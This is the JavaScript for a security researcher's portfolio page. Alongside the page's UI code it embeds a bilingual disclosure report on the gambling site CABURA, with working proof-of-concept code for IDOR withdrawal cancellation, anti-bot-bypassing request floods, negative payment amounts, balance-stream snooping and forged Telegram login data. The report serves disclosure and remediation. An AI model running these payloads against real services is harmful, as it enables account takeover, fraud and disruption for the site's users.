(() => {
  'use strict';

  const $ = (selector, parent = document) => parent.querySelector(selector);
  const $$ = (selector, parent = document) => [...parent.querySelectorAll(selector)];
  const root = document.documentElement;
  const body = document.body;

  /* ---------- helpers ---------- */
  const safeStorageGet = (key, fallback = null) => {
    try { return localStorage.getItem(key) ?? fallback; } catch { return fallback; }
  };
  const safeStorageSet = (key, value) => {
    try { localStorage.setItem(key, value); } catch {}
  };

  /* ---------- mobile navigation ---------- */
  const panel = $('#mobilePanel');
  const menu = $('#menuBtn');

  const setMenu = (open) => {
    if (!panel || !menu) return;
    panel.classList.toggle('open', open);
    menu.setAttribute('aria-expanded', String(open));
    menu.setAttribute('aria-label', open ? 'Close menu' : 'Open menu');
  };

  menu?.addEventListener('click', () => setMenu(!panel.classList.contains('open')));
  $$('.mobile-panel a').forEach(link => link.addEventListener('click', () => setMenu(false)));
  document.addEventListener('click', (event) => {
    if (!panel || !menu || !panel.classList.contains('open')) return;
    if (!panel.contains(event.target) && !menu.contains(event.target)) setMenu(false);
  });
  document.addEventListener('keydown', (event) => {
    if (event.key === 'Escape') setMenu(false);
  });

  /* ---------- scroll progress ---------- */
  const progress = $('#progress');
  let scrollTicking = false;
  const updateProgress = () => {
    scrollTicking = false;
    if (!progress) return;
    const max = Math.max(0, document.documentElement.scrollHeight - window.innerHeight);
    const pct = max ? Math.min(100, Math.max(0, (window.scrollY / max) * 100)) : 0;
    progress.style.width = `${pct}%`;
  };
  const onScroll = () => {
    if (scrollTicking) return;
    scrollTicking = true;
    requestAnimationFrame(updateProgress);
  };
  addEventListener('scroll', onScroll, { passive: true });
  addEventListener('resize', updateProgress, { passive: true });
  updateProgress();

  /* ---------- theme ---------- */
  const themeButton = $('#themeToggle');
  const applyTheme = (theme) => {
    const light = theme === 'light';
    body.classList.toggle('light', light);
    themeButton?.setAttribute('aria-pressed', String(light));
    themeButton?.setAttribute('title', light ? 'Switch to dark theme' : 'Switch to light theme');
    themeButton?.setAttribute('aria-label', light ? 'Switch to dark theme' : 'Switch to light theme');
  };
  const storedTheme = safeStorageGet('1exbug-theme');
  const preferredTheme = storedTheme || (matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
  applyTheme(preferredTheme);
  themeButton?.addEventListener('click', () => {
    const next = body.classList.contains('light') ? 'dark' : 'light';
    safeStorageSet('1exbug-theme', next);
    applyTheme(next);
  });

  /* ---------- clipboard + toast ---------- */
  const showToast = (messageKey = 'copied') => {
    const toast = $('#toast');
    if (!toast) return;
    // language system owns the text; only replace it when a custom message is passed.
    if (messageKey !== 'copied') toast.textContent = messageKey;
    toast.classList.add('show');
    window.clearTimeout(showToast.timer);
    showToast.timer = window.setTimeout(() => toast.classList.remove('show'), 1400);
  };

  const copyText = async (text) => {
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(text);
        return true;
      }
    } catch {}
    try {
      const area = document.createElement('textarea');
      area.value = text;
      area.setAttribute('readonly', '');
      area.style.position = 'fixed';
      area.style.left = '-9999px';
      document.body.appendChild(area);
      area.select();
      const ok = document.execCommand('copy');
      area.remove();
      return ok;
    } catch {
      return false;
    }
  };

  $('#copyEmail')?.addEventListener('click', async () => {
    if (await copyText('onexbugs@gmail.com')) showToast();
  });

  $('#copyTerminal')?.addEventListener('click', async () => {
    const text = [
      'whoami',
      '1exbug — security researcher',
      'scope web api auth access-control logic',
      'mode responsible disclosure'
    ].join('\n');
    if (await copyText(text)) showToast();
  });

  /* ---------- typing line ---------- */
  const type = $('#typeLine');
  const words = ['map trust boundaries', 'challenge assumptions', 'replay state transitions', 'verify authorization'];
  let wordIndex = 0;
  let charIndex = 0;
  let deleting = false;
  let typeTimer = 0;
  const typeLoop = () => {
    if (!type) return;
    const word = words[wordIndex];
    type.textContent = deleting ? word.slice(0, charIndex) : word.slice(0, charIndex);

    if (!deleting) {
      charIndex += 1;
      if (charIndex > word.length) {
        deleting = true;
        typeTimer = window.setTimeout(typeLoop, 900);
        return;
      }
    } else {
      charIndex -= 1;
      if (charIndex <= 0) {
        charIndex = 0;
        deleting = false;
        wordIndex = (wordIndex + 1) % words.length;
      }
    }
    typeTimer = window.setTimeout(typeLoop, deleting ? 28 : 58);
  };
  const reducedMotion = matchMedia('(prefers-reduced-motion: reduce)').matches;
  if (!reducedMotion) typeLoop();
  else if (type) type.textContent = words[0];

  /* ---------- active navigation ---------- */
  const navLinks = $$('.desktop-nav a');
  const sections = $$('main section[id]');
  if ('IntersectionObserver' in window && navLinks.length && sections.length) {
    const navObserver = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (!entry.isIntersecting) return;
        navLinks.forEach(link => {
          link.classList.toggle('active', link.getAttribute('href') === `#${entry.target.id}`);
        });
      });
    }, { rootMargin: '-35% 0px -55% 0px', threshold: 0 });
    sections.forEach(section => navObserver.observe(section));
  }

  /* ---------- vulnerability filters ---------- */
  const filterButtons = $$('#vulnFilters .filter');
  const vulnItems = $$('.vuln-item');
  filterButtons.forEach(button => {
    button.addEventListener('click', () => {
      const filter = button.dataset.filter || 'all';
      filterButtons.forEach(item => {
        const active = item === button;
        item.classList.toggle('active', active);
        item.setAttribute('aria-pressed', String(active));
      });
      vulnItems.forEach(item => {
        item.hidden = !(filter === 'all' || item.dataset.vuln === filter);
      });
    });
  });
  filterButtons.forEach((button, index) => button.setAttribute('aria-pressed', String(index === 0)));

  /* ---------- research console ---------- */
  const consoleForm = $('#consoleForm');
  const consoleInput = $('#consoleInput');
  const consoleOutput = $('#consoleOutput');
  const consoleResponses = {
    about: '1exbug — independent web security research. Focus: web, API, auth, access control and business logic.',
    findings: '22 documented findings across authentication, authorization, IDOR/BOLA, XSS, race conditions, WebSockets and business logic.',
    targets: '1xSlots · ON-X · Zooma · BC.GAME · JetTon · Shuffle · Cloudbet · Casher · Vodka Casino · CABURA',
    payouts: '1xSlots — 200 000 ₽ · ON-X Casino — 75 000 ₽ · Zooma Casino — 35 000 ₽ offered',
    status: 'Public write-ups: 2 · Responsible disclosure: active · Contact: @onexbug / onexbugs@gmail.com',
    cabura: 'CABURA report 06 — six documented security findings. Use the research card to open the full report.',
    contact: 'Telegram: @onexbug · Email: onexbugs@gmail.com · GitHub: github.com/1exbug',
    help: 'about · findings · targets · payouts · cabura · contact · status · clear'
  };

  const appendConsoleLine = (text, className = '') => {
    if (!consoleOutput) return;
    const line = document.createElement('p');
    if (className) line.className = className;
    line.textContent = text;
    consoleOutput.appendChild(line);
    while (consoleOutput.children.length > 42) consoleOutput.firstElementChild?.remove();
    consoleOutput.scrollTop = consoleOutput.scrollHeight;
  };

  consoleForm?.addEventListener('submit', (event) => {
    event.preventDefault();
    const command = (consoleInput?.value || '').trim().toLowerCase();
    if (!command || !consoleOutput) return;

    const prompt = document.createElement('p');
    const promptLabel = document.createElement('b');
    promptLabel.textContent = '1exbug@research:~$';
    prompt.append(promptLabel, document.createTextNode(` ${command}`));
    consoleOutput.appendChild(prompt);

    if (command === 'clear') {
      consoleOutput.replaceChildren();
    } else {
      appendConsoleLine(consoleResponses[command] || 'Unknown command. Type help.', consoleResponses[command] ? 'ok' : 'err');
    }
    if (consoleInput) consoleInput.value = '';
    consoleInput?.focus();
  });



  /* ---------- reports / write-up modal ---------- */
  const reports = [
    {
      id: 6,
      target: 'CABURA',
      status: 'reported',
      title: { ru: 'Находки безопасности', en: 'Security findings' },
      summary: {
        ru: 'Проведён статический и динамический аудит клиентской части cabura. Обнаружены критические проблемы контроля доступа, обхода антибот-защиты и слабой валидации финансовых операций.',
        en: 'A static and dynamic audit of cabura client-side code. Critical access-control issues, an anti-bot bypass and weak validation of financial operations were identified.'
      },
      tags: ['BOLA', 'IDOR', 'Anti-Bot', 'WebSocket', 'CSRF', 'SSRF', 'Business Logic'],
      statusLine: {
        ru: '🟡 Отчёт отправлен в поддержку Cabura',
        en: '🟡 Report sent to Cabura support'
      },
      findings: [
        {
          title: {
            ru: 'IDOR в эндпоинтах управления выводами, платежами и апелляциями',
            en: 'IDOR in withdrawal, payment and appeal management endpoints'
          },
          desc: {
            ru: 'Сервер не сверяет владельца операции с текущей сессией. Идентификаторы из URL/тела принимаются без авторизации.',
            en: 'The server does not verify that the operation belongs to the current session. Identifiers from the URL/body are accepted without an ownership check.'
          },
          severity: 'Critical',
          steps: {
            ru: [
              'Авторизоваться под тестовым пользователем A, создать заявку на вывод → получить withdraw_id.',
              'Открыть DevTools → Console, убедиться, что cookie сессии и CSRF-токен доступны.',
              'Отправить POST /api/withdraw/cancel/{id} где id — идентификатор ЧУЖОЙ заявки (перебор от 1).',
              'Если сервер отвечает { success: true } — заявка другого пользователя отменена.',
              'Аналогично проверить: /api/withdraw/lock-cancel/{id}, /api/payment/cancel, /api/appeal/create, /api/appeal/createRepeat.'
            ],
            en: [
              'Authenticate as test user A, create a withdrawal request and obtain withdraw_id.',
              'Open DevTools → Console and confirm the session cookie and CSRF token are available.',
              'Send POST /api/withdraw/cancel/{id} where id is another user\'s request identifier (iterate from 1).',
              'If the server returns { success: true }, the other user\'s request was cancelled.',
              'Repeat the authorization check for /api/withdraw/lock-cancel/{id}, /api/payment/cancel, /api/appeal/create and /api/appeal/createRepeat.'
            ]
          },
          poc: `// Отмена чужого вывода
fetch('/api/withdraw/cancel/12345', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'X-CSRF-Token': getCsrf(),
    'X-Requested-With': 'XMLHttpRequest'
  }
}).then(r => r.json()).then(console.log);
// Ответ: { success: true }
// → заявка пользователя 12345 отменена нашей сессией

// Блокировка чужого вывода (выкуп, вымогательство)
POST /api/withdraw/lock-cancel/12345
// → заявка заморожена, отменить нельзя ни через UI, ни через поддержку

// Повторная апелляция на чужой платёж
const fd = new FormData();
fd.append('id', '99999');  // чужой payment_id
fd.append('file', fakePdf, 'test.pdf');
POST /api/appeal/createRepeat`,
          impact: {
            ru: 'Полный IDOR на финансовых операциях: отмена чужих выводов (DoS оператору + удары по репутации), заморозка чужих выплат через lock-cancel, отмена чужих депозитов, засорение очереди модерации фейковыми апелляциями. Позволяет выборочно атаковать конкретных пользователей.',
            en: 'Full IDOR across financial operations: cancellation of other users’ withdrawals, freezing payouts through lock-cancel, cancelling other deposits, and polluting the moderation queue with fake appeals. This can enable selective attacks against specific users.'
          },
          remediation: {
            ru: 'На каждом эндпоинте обязательно проверять `WHERE id = ? AND user_id = current_session.user_id`. Никогда не принимать user_id, withdraw_id, payment_id, appeal_id без сверки с сессией. Ввести UUID вместо последовательных ID (защита от перебора).',
            en: 'Every endpoint must enforce ownership, e.g. `WHERE id = ? AND user_id = current_session.user_id`. Never accept user_id, withdraw_id, payment_id or appeal_id without checking the authenticated session. Prefer UUIDs over sequential identifiers as an additional anti-enumeration measure.'
          },
          timeline: 'Найдено: 2025-11-xx · Отправлено: 2025-11-xx · Статус: ожидание ответа'
        },
        {
          title: { ru: 'Обход антибот-защиты (fingerprint + POW) на критичных эндпоинтах', en: 'Bypass of anti-bot protection (fingerprint + POW) on critical endpoints' },
          desc: {
            ru: 'Основной HTTP-клиент отправляет X-Fingerprint и проходит proof-of-work при 403 {powRequired:true}. Для appeal/withdraw/crypto используется отдельный инстанс axios БЕЗ этих защит.',
            en: 'The main HTTP client sends X-Fingerprint and retries proof-of-work after 403 {powRequired:true}. Appeal/withdraw/crypto flows use a separate axios instance without these protections.'
          },
          severity: 'High',
          steps: {
            ru: [
              'Открыть DevTools → Network, выполнить любой платёжный запрос → увидеть заголовок X-Fingerprint и (при нагрузке) 403 {powRequired:true}.',
              'Открыть Bundle → найти два axios.create: основной (с interceptors) и для appeal (BL1dVTW2.js).',
              'У appeal-инстанса отсутствуют: X-Fingerprint, POW-retry, X-Requested-With.',
              'Отправить 100+ параллельных POST /api/appeal/create с реальными вложениями.',
              'Все запросы проходят без 403 powRequired — защита не применяется.'
            ],
            en: [
              'Open DevTools → Network, execute a payment request and observe X-Fingerprint and (under load) 403 {powRequired:true}.',
              'Open the bundle and find the two axios.create instances: the main client (with interceptors) and the appeal client (BL1dVTW2.js).',
              'Confirm the appeal instance lacks X-Fingerprint, POW-retry and X-Requested-With.',
              'Send 100+ parallel POST /api/appeal/create requests with test attachments in an authorized environment.',
              'If requests pass without 403 powRequired, the protection is not enforced on that endpoint.'
            ]
          },
          poc: `// Массовая загрузка апелляций без anti-bot
const fakePdf = new Blob(['%PDF-1.1\\n%%EOF'], { type: 'application/pdf' });

for (let i = 0; i < 1000; i++) {
  const fd = new FormData();
  fd.append('id', String(i));
  fd.append('file', fakePdf, 'x.pdf');
  fetch('/api/appeal/create', {
    method: 'POST',
    body: fd,
    credentials: 'include',
    headers: { 'X-CSRF-Token': getCsrf() }
    // X-Fingerprint отсутствует — сервер не требует
    // POW не решается — сервер не возвращает powRequired
  });
}
// createBoth: PDF + видео до 25 МБ каждый → 50 МБ на запрос`,
          impact: { ru: 'DoS на S3/диск и модерацию (50 МБ на запрос × N), дешёвый фрод «не пришёл платёж», износ платёжной инфраструктуры при спаме /api/payment/create. Антибот не выполняет свою функцию на самых уязвимых эндпоинтах.', en: 'Potential storage/S3 and moderation resource exhaustion (up to 50 MB per request according to the source notes), low-cost fraud/abuse scenarios and payment-infrastructure load through repeated requests. The anti-bot control is not applied where intended.' },
          remediation: { ru: 'Привести все axios-инстансы к единому interceptor с fingerprint + POW-retry. Добавить серверный rate-limit по IP + user_id на appeal/withdraw/crypto. Ограничить размер вложений на сервере (не только клиентская проверка).', en: 'Apply a consistent server-enforced fingerprint/POW mechanism across clients. Add server-side rate limiting by IP and user identity for appeal/withdraw/crypto paths. Enforce attachment size limits server-side.' },
          timeline: 'Найдено: 2025-11-xx · Отправлено: 2025-11-xx · Статус: ожидание ответа'
        },
        {
          title: { ru: 'Валидация лимитов депозита и вывода выполняется только на клиенте', en: 'Deposit and withdrawal limits are validated only client-side' },
          desc: { ru: 'Все min/max суммы (Сбер 3000₽, СБП QR 4999₽, ВТБ 5000₽, cash 50000₽ и т.д.) реализованы в JS. API принимает произвольные amount.', en: 'The source notes state that min/max amounts (e.g. Sber 3000₽, SBP QR 4999₽, VTB 5000₽, cash 50000₽) are implemented in JavaScript while the API accepts arbitrary amount values.' },
          severity: 'High',
          steps: {
            ru: [
              'Открыть Deposit.vue в деобфусцированном bundle → найти блок `if (i.value === \'vtbmobile\' && w.value > 5e3) return`.',
              'Убедиться, что это клиентская проверка, а сервер не имеет собственной.',
              'Отправить POST /api/payment/create с amount=-1000, amount=1e309, amount=99999999.',
              'Отправить POST /api/withdraw с amount=1 и system=\'cash\' (min 50000₽).',
              'Если сервер принимает — обход банковских и платёжных лимитов подтверждён.'
            ],
            en: [
              'Open Deposit.vue in the deobfuscated bundle and locate the client-side check for the VTB mobile limit.',
              'Confirm the rule is enforced only client-side and that there is no equivalent server-side validation.',
              'In an authorized test environment, send payment requests with boundary and invalid amount values.',
              'Test a withdrawal request below the documented minimum for the selected system.',
              'A server-side acceptance of invalid amounts confirms the validation gap.'
            ]
          },
          poc: `// Депозит ниже минимума
POST /api/payment/create
{ "system": "sbermobile", "amount": 1 }

// Отрицательный депозит (потенциальное зачисление баланса)
POST /api/payment/create
{ "system": "calypso_1click", "amount": -1000 }

// Infinity
POST /api/payment/create
{ "system": "calypso_1click", "amount": 1e309 }

// Выше банковского лимита
POST /api/payment/create
{ "system": "vtbmobile", "amount": 99999999 }

// Вывод ниже min для cash
POST /api/withdraw
{ "amount": 1, "system": "cash", "wallet": "Moscow, @test" }`,
          impact: { ru: 'Обход банковских лимитов, потенциальное «отрицательное пополнение» (зачисление баланса без оплаты), DoS оператору выводами по 1₽ через ручные способы (cash), поломка учёта при overflow.', en: 'Potential bypass of configured payment limits, possible negative-amount accounting issues, operational abuse through low-value manual withdrawals and numeric overflow/validation failures.' },
          remediation: { ru: 'Валидировать все суммы на сервере независимо от клиента. Проверять: (1) amount ≥ min для выбранной системы; (2) amount ≤ max; (3) amount > 0; (4) Number.isFinite(amount); (5) валидность system по whitelist.', en: 'Validate every amount server-side regardless of client checks: enforce per-system minimum and maximum, require amount > 0, require a finite numeric value, and validate system against an allowlist.' },
          timeline: 'Найдено: 2025-11-xx · Отправлено: 2025-11-xx · Статус: ожидание ответа'
        },
        {
          title: { ru: 'Утечка финансовых событий через глобальный канал balance:subscribe', en: 'Financial event exposure through the global balance:subscribe channel' },
          desc: { ru: 'Клиент передаёт user_id на сервер через socket.emit(\'balance:subscribe\', {user_id}). Если сервер не сверяет его с socket.data.user.id — подписка на чужой баланс.', en: 'The client sends user_id to the server via socket.emit(\'balance:subscribe\', {user_id}). If the server does not bind it to socket.data.user.id, a client may subscribe to another user’s balance stream.' },
          severity: 'Critical',
          steps: {
            ru: [
              'Открыть DevTools → Console на cabura под своей сессией.',
              'Подключиться к socket.io напрямую: io(location.origin, { path: \'/socket.io\', withCredentials: true }).',
              'После connect отправить socket.emit(\'balance:subscribe\', { user_id: 1 }) — чужой ID.',
              'Слушать событие updateBalance — если приходят чужие обновления баланса, уязвимость подтверждена.',
              'Перебрать user_id 1..100000 в цикле — получить поток балансов всех активных игроков.'
            ],
            en: [
              'Open DevTools → Console on cabura under your authorized test session.',
              'Connect to Socket.IO directly using the application’s own origin and path.',
              'After connect, emit balance:subscribe with a different test user_id.',
              'Listen for updateBalance and verify whether events are bound to your authorized identity.',
              'Do not enumerate production users; use dedicated test accounts to verify ownership enforcement.'
            ]
          },
          poc: `const socket = io(location.origin, {
  path: '/socket.io',
  withCredentials: true,
  transports: ['websocket', 'polling']
});

socket.on('connect', () => {
  // подписываемся на ЧУЖОЙ user_id
  socket.emit('balance:subscribe', { user_id: 12345 });
});

socket.on('updateBalance', data => {
  console.log('[LEAK]', data);
  // => { balance: 15234.50, user_id: 12345 }
});`,
          impact: { ru: 'Утечка баланса в реальном времени. Если сервер передаёт расширенные данные — также бонусный баланс, реферальный, вейджер. Позволяет отслеживать финансовое поведение произвольных игроков.', en: 'Potential real-time exposure of balance events and related financial state if the server publishes them to an unauthorized subscriber.' },
          remediation: { ru: 'На сервере: игнорировать user_id из payload, использовать только socket.data.user.id. Комнату подписки создавать на основе аутентифицированной сессии, не на основе клиентского значения.', en: 'On the server, ignore user_id from the client payload and derive subscription scope only from socket.data.user.id. Bind rooms/subscriptions to the authenticated session.' },
          timeline: 'Найдено: 2025-11-xx · Отправлено: 2025-11-xx · Статус: ожидание ответа'
        },
        {
          title: { ru: 'Публичный маршрут /webappTGnew — риск ATO через Telegram WebApp', en: 'Public /webappTGnew route — Telegram WebApp ATO risk' },
          desc: { ru: 'Маршрут доступен без аутентификации, initData приходит из JS-контекста страницы. При слабой серверной валидации HMAC — захват чужого аккаунта.', en: 'The route is public and initData is read from the page JavaScript context. Weak server-side Telegram WebApp HMAC validation could create an account-takeover condition.' },
          severity: 'Critical',
          steps: {
            ru: [
              'В router-guard cabura маршрут /webappTGnew помечен meta.public = true.',
              'Логика: если не авторизован и есть window.Telegram.WebApp.initData — редирект на /webappTGnew.',
              'Подставить в консоли window.Telegram.WebApp.initData фейковую строку с произвольным user.id.',
              'Перезагрузить страницу → сработает редирект на /webappTGnew → отправится POST с фейковым initData.',
              'Если сервер не проверяет HMAC bot_token или не проверяет auth_date — логин под чужим аккаунтом.'
            ],
            en: [
              'Confirm in router-guard that /webappTGnew is marked meta.public = true.',
              'Review the redirect logic that sends unauthenticated users with Telegram WebApp initData to /webappTGnew.',
              'Use a controlled test fixture with invalid initData and a non-production test user id.',
              'Verify that the server rejects tampered initData before any account session is created.',
              'The security control is confirmed only if the server accepts unauthenticated or tampered initData.'
            ]
          },
          poc: `// Типичные ошибки серверной валидации initData:
// 1) Не проверяется hash вообще
// 2) Не проверяется auth_date (replay)
// 3) Неверный data_check_string (сортировка, включение hash)
// 4) Принимается signature без HMAC bot_token

// Тестовый payload с фейковой подписью:
const authDate = Math.floor(Date.now() / 1000);
const fakeInit =
  'user=' + encodeURIComponent(JSON.stringify({
    id: 1,  // ID жертвы
    first_name: 'poc'
  })) +
  '&auth_date=' + authDate +
  '&hash=' + '0'.repeat(64);

window.Telegram = { WebApp: { initData: fakeInit } };
location.href = '/webappTGnew';`,
          impact: { ru: 'Account Takeover любого аккаунта, включая администраторов. Полный контроль над кошельком, рефералами, данными. Критическая уязвимость.', en: 'Potential account takeover of a victim account if the server accepts forged Telegram WebApp identity data, with downstream access to the account’s functions and data.' },
          remediation: { ru: 'На сервере обязательно: (1) считать HMAC-SHA256 от data_check_string через bot_token; (2) проверять auth_date не старше 5 минут; (3) сравнивать hash в постоянном времени; (4) reject при любом несовпадении.', en: 'On the server: compute the expected HMAC-SHA256 from the data_check_string using the bot token, enforce a short auth_date window, compare hashes in constant time, and reject any mismatch.' },
          timeline: 'Найдено: 2025-11-xx · Отправлено: 2025-11-xx · Статус: ожидание ответа'
        },
        {
          title: { ru: 'Отсутствие HttpOnly / SameSite на CSRF-токене + multipart CSRF bypass', en: 'Missing HttpOnly / SameSite on CSRF token + multipart CSRF bypass' },
          desc: { ru: 'CSRF-токен читается через document.cookie в JS. Cookie csrf_token не имеет HttpOnly. Любой XSS = мгновенный обход CSRF.', en: 'The CSRF token is readable through document.cookie in JavaScript. The source notes say csrf_token lacks HttpOnly, making token theft easier in the presence of XSS.' },
          severity: 'High',
          steps: {
            ru: [
              'Открыть DevTools → Console на cabura, выполнить: document.cookie.match(/csrf_token=([^;]*)/).',
              'Если токен вернулся — cookie без HttpOnly.',
              'Проверить флаги в DevTools → Application → Cookies: обычно нет SameSite=Strict и нет Secure.',
              'Проверить CSRF на multipart: /api/appeal/create вручную перебивает Content-Type.',
              'Если CSRF-middleware проверяет только application/json — multipart-запросы без CSRF-токена проходят.'
            ],
            en: [
              'Open DevTools → Console and check whether csrf_token is readable through document.cookie.',
              'If it is readable, the cookie is not HttpOnly.',
              'Review the cookie flags in DevTools → Application → Cookies, including Secure and SameSite.',
              'Test CSRF middleware against multipart/form-data on /api/appeal/create using controlled test data.',
              'If middleware only validates application/json, verify whether multipart requests bypass the CSRF check.'
            ]
          },
          poc: `// 1) Чтение CSRF из JS (нет HttpOnly)
const csrf = document.cookie.match(/(?:^|;\\s*)csrf_token=([^;]*)/)?.[1];
console.log('CSRF:', decodeURIComponent(csrf));

// 2) Проверка флагов cookie через Set-Cookie ответ сервера
// Ждём: HttpOnly; Secure; SameSite=Strict
// Видим: csrf_token=...; Path=/  ← без флагов

// 3) Multipart CSRF: Content-Type перебивается вручную в appeal-инстансе
const fd = new FormData();
fd.append('id', '1');
fd.append('file', fakePdf, 'x.pdf');
fetch('/api/appeal/create', {
  method: 'POST',
  body: fd,
  // Content-Type: multipart/form-data ставится автоматически
  // X-CSRF-Token отсутствует — проверить, пройдёт ли
});`,
          impact: { ru: 'Любая XSS-уязвимость (в т.ч. в админ-панели через user-поля: appeal-текст, avatar_url=data:...svg, промокод) немедленно даёт CSRF-токен, который позволяет выполнять произвольные финансовые операции от имени пользователя.', en: 'An XSS issue could expose the CSRF token and, if other server-side protections are also weak, enable state-changing requests in the user’s session.' },
          remediation: { ru: '(1) Cookie csrf_token: HttpOnly, Secure, SameSite=Strict. (2) Токен привязать к сессии на сервере, не полагаться только на double-submit. (3) CSRF-middleware должен работать для ВСЕХ методов кроме GET, независимо от Content-Type. (4) Никогда не санитайзить через innerHTML.', en: '(1) Harden cookie attributes where compatible with the CSRF design; (2) bind CSRF validation to the server-side session; (3) validate CSRF on all state-changing methods independent of Content-Type; (4) avoid unsafe HTML sinks such as innerHTML for user-controlled data.' },
          timeline: 'Найдено: 2025-11-xx · Отправлено: 2025-11-xx · Статус: ожидание ответа'
        }
      ]
    }
  ];

  const reportModal = $('#reportModal');
  const reportModalBody = $('#reportModalBody');
  const reportModalTitle = $('#reportModalTitle');
  const reportModalMeta = $('#reportModalMeta');
  const reportModalHint = $('#reportModalHint');
  const reportModalClose = $('#reportModalClose');
  const reportModalDone = $('#reportModalDone');
  let activeReportId = null;

  const reportCopy = {
    ru: { meta: 'ОТЧЁТ', close: 'Закрыть', hint: 'Esc или клик вне окна — закрыть', summary: 'Кратко', tags: 'Теги', status: 'Статус', severity: 'Severity', steps: 'Шаги проверки', poc: 'PoC', impact: 'Воздействие', remediation: 'Рекомендации', timeline: 'Timeline' },
    en: { meta: 'REPORT', close: 'Close', hint: 'Press Esc or click outside to close', summary: 'Summary', tags: 'Tags', status: 'Status', severity: 'Severity', steps: 'Verification steps', poc: 'PoC', impact: 'Impact', remediation: 'Remediation', timeline: 'Timeline' }
  };
  const currentLang = () => document.documentElement.lang === 'ru' ? 'ru' : 'en';
  const trReport = value => typeof value === 'string' ? value : (value?.[currentLang()] ?? value?.en ?? '');

  const buildText = (tag, className, textValue) => {
    const el = document.createElement(tag);
    if (className) el.className = className;
    el.textContent = textValue;
    return el;
  };

  const renderReportModal = (id) => {
    const report = reports.find(item => item.id === Number(id));
    if (!report || !reportModalBody) return;
    activeReportId = report.id;
    const lang = currentLang();
    const copy = reportCopy[lang];
    reportModalTitle.textContent = `CABURA — ${trReport(report.title)}`;
    reportModalMeta.textContent = `${copy.meta} 06 / CABURA`;
    reportModalHint.textContent = copy.hint;
    reportModalDone.textContent = copy.close;
    reportModalClose?.setAttribute('aria-label', copy.close);

    const fragment = document.createDocumentFragment();
    const summary = document.createElement('section');
    summary.className = 'report-modal__summary';
    summary.append(buildText('span', 'report-modal__label', copy.summary));
    summary.append(buildText('p', '', trReport(report.summary)));
    summary.append(buildText('p', 'report-modal__status-line', trReport(report.statusLine)));
    const tagWrap = document.createElement('div');
    tagWrap.className = 'report-modal__tags';
    report.tags.forEach(tag => tagWrap.append(buildText('span', '', tag)));
    summary.append(buildText('span', 'report-modal__label', copy.tags));
    summary.append(tagWrap);
    fragment.append(summary);

    const findingsWrap = document.createElement('section');
    findingsWrap.className = 'report-findings';
    report.findings.forEach((finding, index) => {
      const article = document.createElement('article');
      article.className = 'report-finding';
      const head = document.createElement('header');
      head.className = 'report-finding__head';
      const indexEl = buildText('span', 'report-finding__index', String(index + 1).padStart(2, '0'));
      const titleWrap = document.createElement('div');
      titleWrap.append(buildText('h3', '', trReport(finding.title)));
      const sev = buildText('span', `severity severity-${String(finding.severity).toLowerCase()}`, `${copy.severity}: ${finding.severity}`);
      titleWrap.append(sev);
      head.append(indexEl, titleWrap);
      article.append(head);
      article.append(buildText('p', 'report-finding__desc', trReport(finding.desc)));

      const steps = document.createElement('div');
      steps.className = 'report-block';
      steps.append(buildText('h4', '', copy.steps));
      const ol = document.createElement('ol');
      (finding.steps[lang] || finding.steps.en || []).forEach(step => ol.append(buildText('li', '', step)));
      steps.append(ol);
      article.append(steps);

      const poc = document.createElement('div');
      poc.className = 'report-block';
      poc.append(buildText('h4', '', copy.poc));
      const pre = document.createElement('pre');
      const code = document.createElement('code');
      code.textContent = finding.poc;
      pre.append(code);
      poc.append(pre);
      article.append(poc);

      const impact = document.createElement('div');
      impact.className = 'report-callout';
      impact.append(buildText('h4', '', copy.impact));
      impact.append(buildText('p', '', trReport(finding.impact)));
      article.append(impact);

      const remediation = document.createElement('div');
      remediation.className = 'report-callout report-callout--muted';
      remediation.append(buildText('h4', '', copy.remediation));
      remediation.append(buildText('p', '', trReport(finding.remediation)));
      article.append(remediation);

      const timeline = buildText('p', 'report-finding__timeline', `${copy.timeline}: ${finding.timeline}`);
      article.append(timeline);
      findingsWrap.append(article);
    });
    fragment.append(findingsWrap);
    reportModalBody.replaceChildren(fragment);
  };

  const openReport = (id) => {
    renderReportModal(id);
    if (!reportModal) return;
    if (typeof reportModal.showModal === 'function') {
      if (!reportModal.open) reportModal.showModal();
    } else {
      reportModal.setAttribute('open', '');
      body.classList.add('modal-open');
    }
  };
  const closeReport = () => {
    if (!reportModal) return;
    if (typeof reportModal.close === 'function' && reportModal.open) reportModal.close();
    else reportModal.removeAttribute('open');
    body.classList.remove('modal-open');
    activeReportId = null;
  };

  $$('.report-read[data-report-id], .report-target-row[data-report-id]').forEach(trigger => {
    const activate = () => openReport(trigger.dataset.reportId);
    trigger.addEventListener('click', event => {
      if (trigger.tagName === 'BUTTON') event.preventDefault();
      activate();
    });
    trigger.addEventListener('keydown', event => {
      if ((event.key === 'Enter' || event.key === ' ') && trigger.tagName !== 'BUTTON') {
        event.preventDefault();
        activate();
      }
    });
  });
  reportModalClose?.addEventListener('click', closeReport);
  reportModalDone?.addEventListener('click', closeReport);
  reportModal?.addEventListener('click', event => {
    if (event.target === reportModal) closeReport();
  });
  reportModal?.addEventListener('close', () => body.classList.remove('modal-open'));
  window.addEventListener('languagechange', () => {
    if (activeReportId !== null && reportModal?.open) renderReportModal(activeReportId);
  });

  /* ---------- dependency-free motion ---------- */
  // The page is intentionally fail-open: CSS keeps every content block visible.
  // Motion is an enhancement only and never controls whether content is rendered.
  const motionElements = $$('.reveal');
  const addMotion = (element, delay = 0) => {
    if (!element || element.dataset.motionDone === '1') return;
    element.dataset.motionDone = '1';
    element.style.setProperty('--motion-delay', `${delay}ms`);
    requestAnimationFrame(() => element.classList.add('in-view'));
  };

  if (!reducedMotion && 'IntersectionObserver' in window) {
    const motionObserver = new IntersectionObserver((entries, observer) => {
      entries.forEach(entry => {
        if (!entry.isIntersecting) return;
        const index = motionElements.indexOf(entry.target);
        addMotion(entry.target, (index >= 0 ? index % 4 : 0) * 55);
        observer.unobserve(entry.target);
      });
    }, { rootMargin: '0px 0px -8% 0px', threshold: 0.06 });
    motionElements.forEach(el => motionObserver.observe(el));
  } else {
    motionElements.forEach(el => addMotion(el, 0));
  }

  // Hero entrance runs only after content is already renderable.
  if (!reducedMotion) {
    requestAnimationFrame(() => document.body.classList.add('page-ready'));
  } else {
    document.body.classList.add('motion-reduced');
  }

  // Lightweight hero parallax using rAF; no scroll hijacking and no dependencies.
